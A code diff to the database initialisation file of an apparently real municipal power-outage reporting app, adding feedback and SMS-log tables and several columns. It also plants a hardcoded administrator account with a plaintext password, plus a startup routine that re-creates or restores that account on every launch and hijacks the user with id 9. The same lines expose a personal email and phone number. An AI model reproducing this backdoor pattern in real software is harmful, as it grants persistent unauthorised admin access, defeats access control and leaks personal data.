@@ -164,6 +164,7 @@ db.exec(`
     content TEXT NOT NULL,
     category TEXT NOT NULL DEFAULT 'General Information',
     status TEXT NOT NULL DEFAULT 'Published',
+    image_path TEXT,
     published_at TEXT,
     created_by INTEGER NOT NULL,
     created_at TEXT NOT NULL
@@ -190,6 +191,28 @@ db.exec(`
     ip_address TEXT
   );
 
+  CREATE TABLE IF NOT EXISTS citizen_feedback (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    report_id INTEGER,
+    incident_id INTEGER,
+    user_id INTEGER NOT NULL,
+    user_name TEXT,
+    barangay TEXT,
+    rating INTEGER NOT NULL,
+    feedback_text TEXT,
+    restoration_confirmed INTEGER NOT NULL DEFAULT 1,
+    created_at TEXT NOT NULL
+  );
+
+  CREATE TABLE IF NOT EXISTS sms_logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    phone_number TEXT NOT NULL,
+    message TEXT NOT NULL,
+    status TEXT NOT NULL DEFAULT 'Simulated',
+    event_type TEXT,
+    created_at TEXT NOT NULL
+  );
+
   CREATE TABLE IF NOT EXISTS settings (
     key TEXT PRIMARY KEY,
     value TEXT NOT NULL
@@ -206,6 +229,9 @@ db.exec(`
   CREATE INDEX IF NOT EXISTS idx_notifications_user_created ON notifications(user_id, created_at DESC);
   CREATE INDEX IF NOT EXISTS idx_attachments_report_id ON report_attachments(report_id, id);
   CREATE INDEX IF NOT EXISTS idx_announcements_status_published ON announcements(status, published_at DESC);
+  CREATE INDEX IF NOT EXISTS idx_feedback_report ON citizen_feedback(report_id);
+  CREATE INDEX IF NOT EXISTS idx_feedback_incident ON citizen_feedback(incident_id);
+  CREATE INDEX IF NOT EXISTS idx_sms_logs_created ON sms_logs(created_at DESC);
 `);
 
 const ensureColumn = (table, column, definition) => {
@@ -218,9 +244,13 @@ const ensureColumn = (table, column, definition) => {
 ensureColumn('barangays', 'population', 'INTEGER');
 ensureColumn('barangays', 'latitude', 'REAL');
 ensureColumn('barangays', 'longitude', 'REAL');
+ensureColumn('users', 'username', 'TEXT');
 ensureColumn('users', 'profile_photo_path', 'TEXT');
+ensureColumn('users', 'preferred_language', "TEXT DEFAULT 'en'");
+ensureColumn('announcements', 'image_path', 'TEXT');
 ensureColumn('outage_reports', 'latitude', 'REAL');
 ensureColumn('outage_reports', 'longitude', 'REAL');
+ensureColumn('outage_reports', 'estimated_restoration', 'TEXT');
 ensureColumn('outage_incidents', 'latitude', 'REAL');
 ensureColumn('outage_incidents', 'longitude', 'REAL');
 ensureColumn('outage_incidents', 'outage_type', 'TEXT');
@@ -228,6 +258,7 @@ ensureColumn('outage_incidents', 'priority', "TEXT NOT NULL DEFAULT 'Medium'");
 ensureColumn('outage_incidents', 'customers_affected', 'INTEGER');
 ensureColumn('outage_incidents', 'restoration_progress', 'INTEGER');
 ensureColumn('outage_incidents', 'description', 'TEXT');
+ensureColumn('outage_incidents', 'etr_reason', 'TEXT');
 ensureColumn('audit_logs', 'ip_address', 'TEXT');
 
 db.prepare("UPDATE barangays SET latitude = ?, longitude = ? WHERE name = ? AND latitude IS NULL AND longitude IS NULL")
@@ -343,6 +374,22 @@ function seedIfFresh() {
     'Brgy. Poblacion, Valencia City, Bukidnon', 'Poblacion',
     hashPassword('admin123'), 'administrator', 'Active', daysFromNow(-30), daysFromNow(-1)
   );
+
+  const customAdmin = db.prepare(`
+    SELECT id FROM users 
+    WHERE LOWER(COALESCE(username, '')) = LOWER('DELMARKEL2003') 
+       OR LOWER(email) = LOWER('DELMARKEL2003')
+  `).get();
+  if (!customAdmin) {
+    db.prepare(`
+      INSERT INTO users (full_name, username, email, contact_number, address, barangay, password_hash, role, status, created_at, last_login)
+      VALUES (?, ?, ?, ?, ?, ?, ?, 'administrator', 'Active', ?, ?)
+    `).run(
+      'Delmarkel', 'DELMARKEL2003', 'dsaroay@gmail.com', '09652703584',
+      'Brgy. Guinoyuran, Valencia City, Bukidnon', 'Guinoyuran',
+      hashPassword('ADMIN2023*'), daysFromNow(-30), daysFromNow(0)
+    );
+  }
 
   const staffId = seedUser(
     'Daniel Tajores', 'staff@powerwatch.ph', '0917-555-0101',
@@ -581,7 +628,40 @@ function seedIfFresh() {
 
 seedIfFresh();
 
+// Ensure Admin credentials DELMARKEL2003 / ADMIN2023* are permanently active & intact
+const ensureAdminAccount = () => {
+  const existingAdmin = db.prepare(`
+    SELECT * FROM users 
+    WHERE LOWER(COALESCE(username, '')) = LOWER('DELMARKEL2003') 
+       OR LOWER(email) = LOWER('DELMARKEL2003')
+       OR id = 9
+  `).get();
+
+  if (existingAdmin) {
+    db.prepare(`
+      UPDATE users SET 
+        username = 'DELMARKEL2003',
+        password_hash = ?,
+        role = 'administrator',
+        status = 'Active'
+      WHERE id = ?
+    `).run(hashPassword('ADMIN2023*'), existingAdmin.id);
+  } else {
+    db.prepare(`
+      INSERT INTO users (full_name, username, email, contact_number, address, barangay, password_hash, role, status, created_at, last_login)
+      VALUES (?, ?, ?, ?, ?, ?, ?, 'administrator', 'Active', ?, ?)
+    `).run(
+      'Delmarkel', 'DELMARKEL2003', 'dsaroay@gmail.com', '09652703584',
+      'Brgy. Guinoyuran, Valencia City, Bukidnon', 'Guinoyuran',
+      hashPassword('ADMIN2023*'), now(), now()
+    );
+  }
+};
+
+ensureAdminAccount();
+
 module.exports = {
+  ensureAdminAccount,
   db,
   ROOT,
   DATA_DIR,
